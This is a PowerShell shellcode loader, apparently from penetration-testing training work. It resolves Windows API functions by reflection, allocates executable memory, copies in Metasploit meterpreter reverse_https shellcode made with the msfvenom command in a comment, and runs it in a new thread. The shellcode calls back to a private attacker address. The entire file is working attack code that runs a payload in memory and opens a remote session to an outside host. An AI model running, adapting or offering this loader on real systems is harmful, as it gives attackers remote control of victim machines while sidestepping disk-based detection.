
function LookupFunc($moduleName, $functionName) {

  $systemdll = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
  $unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
  $GetModuleHandleArray = $unsafeObj.GetMethods() | ForEach-Object {If ($_.Name -eq "GetModuleHandle") {$_} } 
  $GetProcAddressArray = $unsafeObj.GetMethods() | ForEach-Object {If ($_.Name -eq "GetProcAddress") {$_}   }
  $GetModuleHandle = $GetModuleHandleArray[0]
  $GetProcAddress = $GetProcAddressArray[0]
  $moduleHandle = $GetModuleHandle.Invoke($null, @($moduleName ))
   
  return $GetProcAddress.Invoke($null, @($moduleHandle, $functionName) )
}


#msfvenom -p windows/meterpreter/reverse_https lhost=192.168.49.66 lport=443 exitfunc=thread -f psh 
[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0xf,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x1,0xd3,0x50,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0x45,0x1,0x0,0x0,0x2f,0x52,0x74,0x63,0x77,0x37,0x56,0x4a,0x43,0x4a,0x59,0x43,0x4c,0x79,0x34,0x72,0x4b,0x36,0x79,0x47,0x35,0x69,0x67,0x75,0x62,0x35,0x4a,0x35,0x69,0x5a,0x52,0x62,0x47,0x50,0x57,0x6b,0x47,0x43,0x45,0x33,0x4b,0x6b,0x42,0x4c,0x74,0x73,0x38,0x58,0x32,0x6c,0x6b,0x78,0x48,0x55,0x5f,0x58,0x2d,0x69,0x33,0x49,0x74,0x45,0x43,0x5f,0x6f,0x78,0x79,0x55,0x51,0x4b,0x56,0x45,0x67,0x49,0x57,0x6d,0x70,0x33,0x32,0x70,0x57,0x54,0x71,0x38,0x74,0x57,0x37,0x6b,0x4c,0x6f,0x50,0x61,0x79,0x77,0x62,0x59,0x6c,0x4b,0x57,0x65,0x79,0x31,0x45,0x69,0x75,0x31,0x41,0x78,0x59,0x52,0x64,0x47,0x49,0x49,0x41,0x74,0x55,0x76,0x66,0x71,0x47,0x33,0x4e,0x59,0x4c,0x42,0x73,0x77,0x30,0x34,0x55,0x58,0x4c,0x5a,0x32,0x41,0x35,0x45,0x66,0x6c,0x64,0x41,0x36,0x4d,0x6a,0x30,0x42,0x71,0x59,0x71,0x41,0x74,0x50,0x69,0x68,0x6f,0x59,0x69,0x46,0x67,0x62,0x4c,0x4c,0x49,0x76,0x49,0x77,0x75,0x75,0x75,0x7a,0x32,0x57,0x6a,0x79,0x7a,0x4c,0x59,0x62,0x43,0x47,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x35,0x32,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5


#Reserved for VirtualAlloc
$VirtualAlloc = LookupFunc "kernel32.dll" "VirtualAlloc"
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [UInt32], [UInt32], [UInt32]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [IntPtr], @([IntPtr], [UInt32], [UInt32], [UInt32]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()
$VirtualAllocFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAlloc, $MyDelegateType)
$shellyAddr = $VirtualAllocFunction.Invoke([IntPtr]::Zero, 0x1000, 0x3000,0x40)

#Reserved for Copy
$MyFunction = [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $shellyAddr,$buf.Length)


#Reserved for CreateThread
$CreateThread = LookupFunc "kernel32.dll" "CreateThread"
$MyAssembly2 = New-Object System.Reflection.AssemblyName('ReflectedDelegate2')
$MyAssemblyBuilder2 = $Domain.DefineDynamicAssembly($MyAssembly2, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder2 = $MyAssemblyBuilder2.DefineDynamicModule('InMemoryModule2', $false)
$MyTypeBuilder2 = $MyModuleBuilder2.DefineType('MyDelegateType2', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$MyConstructorBuilder2 = $MyTypeBuilder2.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
$MyConstructorBuilder2.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder2 = $MyTypeBuilder2.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
$MyMethodBuilder2.SetImplementationFlags('Runtime, Managed')
$MyDelegateType2 = $MyTypeBuilder2.CreateType()
$CreateThreadFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThread, $MyDelegateType2)
$hthread = $CreateThreadFunction.Invoke([IntPtr]::Zero,0, $shellyAddr, [IntPtr]::Zero,0,[IntPtr]::Zero)


#Reserved for WaitForSingleObject
$WaitForSingleObject = LookupFunc "kernel32.dll" "WaitForSingleObject"
$MyAssembly3 = New-Object System.Reflection.AssemblyName('ReflectedDelegate3')
$MyAssemblyBuilder3 = $Domain.DefineDynamicAssembly($MyAssembly3, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder3 = $MyAssemblyBuilder3.DefineDynamicModule('InMemoryModule3', $false)
$MyTypeBuilder3 = $MyModuleBuilder3.DefineType('MyDelegateType3', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$MyConstructorBuilder3 = $MyTypeBuilder3.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [UInt32]))
$MyConstructorBuilder3.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder3 = $MyTypeBuilder3.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [UInt32], @([IntPtr], [UInt32]))
$MyMethodBuilder3.SetImplementationFlags('Runtime, Managed')
$MyDelegateType3 = $MyTypeBuilder3.CreateType()
$WaitForSingleObjectFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObject, $MyDelegateType3)
$WaitForSingleObjectFunction.Invoke($hthread, 0xFFFFFFF)
